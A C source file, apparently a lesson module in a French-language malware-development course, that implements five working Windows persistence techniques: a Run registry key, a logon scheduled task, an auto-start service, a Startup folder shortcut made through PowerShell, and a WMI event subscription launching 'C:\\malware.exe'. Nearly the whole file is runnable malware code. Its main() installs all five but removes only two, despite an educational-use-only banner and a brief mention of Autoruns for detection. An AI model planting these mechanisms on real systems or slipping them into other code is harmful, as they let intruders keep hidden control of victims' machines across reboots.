/*
 * ⚠️ AVERTISSEMENT STRICT
 * Techniques de malware development. Usage éducatif uniquement.
 *
 * Module 32 : Windows Persistence Techniques
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// 1. Registry Run Key persistence
int persist_registry_run_key(const char* name, const char* path) {
    HKEY hkey;
    LONG result;

    // HKCU pour user-level (pas besoin admin)
    result = RegOpenKeyExA(HKEY_CURRENT_USER,
                           "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                           0, KEY_SET_VALUE, &hkey);

    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to open Run key\n");
        return 0;
    }

    result = RegSetValueExA(hkey, name, 0, REG_SZ,
                            (const BYTE*)path, strlen(path) + 1);

    RegCloseKey(hkey);

    if (result == ERROR_SUCCESS) {
        printf("[+] Registry Run key created: %s\n", name);
        return 1;
    } else {
        printf("[-] Failed to set Run value\n");
        return 0;
    }
}

// 2. Scheduled Task persistence (schtasks.exe)
int persist_scheduled_task(const char* task_name, const char* binary_path) {
    char cmd[512];

    // Créer tâche au logon utilisateur
    snprintf(cmd, sizeof(cmd),
             "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /f",
             task_name, binary_path);

    printf("[*] Creating scheduled task: %s\n", task_name);

    int result = system(cmd);

    if (result == 0) {
        printf("[+] Scheduled task created successfully\n");
        return 1;
    } else {
        printf("[-] Failed to create scheduled task\n");
        return 0;
    }
}

// 3. Windows Service persistence (nécessite privilèges admin)
int persist_windows_service(const char* service_name,
                             const char* display_name,
                             const char* binary_path) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

    if (!scm) {
        printf("[-] Failed to open Service Control Manager (need admin)\n");
        return 0;
    }

    SC_HANDLE service = CreateServiceA(
        scm,
        service_name,
        display_name,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,  // Démarrage automatique
        SERVICE_ERROR_NORMAL,
        binary_path,
        NULL, NULL, NULL, NULL, NULL
    );

    if (service) {
        printf("[+] Service created: %s\n", service_name);
        CloseServiceHandle(service);
        CloseServiceHandle(scm);
        return 1;
    } else {
        printf("[-] Failed to create service (error: %d)\n", GetLastError());
        CloseServiceHandle(scm);
        return 0;
    }
}

// 4. Startup Folder persistence
int persist_startup_folder(const char* binary_path, const char* shortcut_name) {
    char startup_path[MAX_PATH];

    // shell:startup pour user actuel
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) != S_OK) {
        printf("[-] Failed to get Startup folder path\n");
        return 0;
    }

    char lnk_path[MAX_PATH];
    snprintf(lnk_path, sizeof(lnk_path), "%s\\%s.lnk", startup_path, shortcut_name);

    // Créer shortcut (simplified - vrai impl utilise IShellLink COM)
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "powershell -Command \"$WS = New-Object -ComObject WScript.Shell; "
             "$SC = $WS.CreateShortcut('%s'); $SC.TargetPath = '%s'; $SC.Save()\"",
             lnk_path, binary_path);

    if (system(cmd) == 0) {
        printf("[+] Startup folder shortcut created: %s\n", lnk_path);
        return 1;
    } else {
        printf("[-] Failed to create startup shortcut\n");
        return 0;
    }
}

// 5. WMI Event Subscription (très furtif, nécessite admin)
int persist_wmi_event_subscription() {
    // Commande PowerShell pour créer WMI subscription
    const char* ps_cmd =
        "powershell -Command \""
        "$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
        "-Arguments @{Name='MyFilter'; EventNamespace='root\\cimv2'; "
        "QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        "WHERE TargetInstance ISA Win32_PerfFormattedData_PerfOS_System'}; "
        "$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer "
        "-Arguments @{Name='MyConsumer'; CommandLineTemplate='C:\\\\malware.exe'}; "
        "Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding "
        "-Arguments @{Filter=$filter; Consumer=$consumer}\"";

    printf("[*] Creating WMI event subscription...\n");

    if (system(ps_cmd) == 0) {
        printf("[+] WMI subscription created (very stealthy)\n");
        return 1;
    } else {
        printf("[-] Failed to create WMI subscription (need admin)\n");
        return 0;
    }
}

// Cleanup functions
void cleanup_registry_run_key(const char* name) {
    HKEY hkey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        RegDeleteValueA(hkey, name);
        RegCloseKey(hkey);
        printf("[*] Removed Run key: %s\n", name);
    }
}

void cleanup_scheduled_task(const char* task_name) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f", task_name);
    system(cmd);
    printf("[*] Removed scheduled task: %s\n", task_name);
}

int main() {
    printf("\n⚠️  AVERTISSEMENT : Techniques de persistence malware dev\n");
    printf("   Usage éducatif uniquement. Tests VM isolées.\n\n");

    char current_exe[MAX_PATH];
    GetModuleFileNameA(NULL, current_exe, MAX_PATH);

    printf("[*] Current executable: %s\n\n", current_exe);

    printf("=== PERSISTENCE TECHNIQUES DEMO ===\n\n");

    // 1. Registry Run key (ne nécessite pas admin)
    printf("[1] Registry Run Key\n");
    persist_registry_run_key("TestPersistence", current_exe);

    // 2. Scheduled Task
    printf("\n[2] Scheduled Task\n");
    persist_scheduled_task("TestTask", current_exe);

    // 3. Startup Folder
    printf("\n[3] Startup Folder\n");
    persist_startup_folder(current_exe, "TestStartup");

    // 4. Windows Service (nécessite admin)
    printf("\n[4] Windows Service\n");
    persist_windows_service("TestService", "Test Service Display", current_exe);

    // 5. WMI Event Subscription (nécessite admin)
    printf("\n[5] WMI Event Subscription\n");
    persist_wmi_event_subscription();

    printf("\n[*] CLEANUP (removing persistence mechanisms)\n\n");
    cleanup_registry_run_key("TestPersistence");
    cleanup_scheduled_task("TestTask");

    printf("\n[!] NOTES:\n");
    printf("- Registry Run keys = méthode la plus commune\n");
    printf("- Scheduled Tasks = très utilisée par malwares\n");
    printf("- WMI Subscriptions = très furtive mais nécessite admin\n");
    printf("- Services = exécution SYSTEM mais très visible\n");
    printf("- Utiliser Autoruns (Sysinternals) pour détecter\n");

    return 0;
}
